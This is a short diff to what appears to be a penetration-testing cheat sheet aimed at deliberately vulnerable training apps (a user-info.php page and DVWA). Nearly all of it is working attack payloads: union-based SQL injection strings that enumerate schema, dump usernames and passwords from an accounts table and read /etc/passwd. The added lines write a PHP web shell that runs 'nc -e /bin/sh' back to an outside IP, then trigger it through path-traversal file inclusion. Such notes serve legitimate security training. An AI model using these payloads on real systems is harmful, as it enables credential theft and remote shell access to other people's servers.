@@ -11,7 +11,9 @@
   - ```?page=user-info.php&username=z' union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'``` 
   - ```?page=user-info.php&username=z' union select 1,username,password,is_admin,5 from accounts``` 
   - ```?page=user-info.php&username=z' union select null,load_file('/etc/passwd'),null,null,null``` 
+- Shell upload 
   - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
+  - 10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php
 - Tips
   - TRUE statements
     - ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1``` 
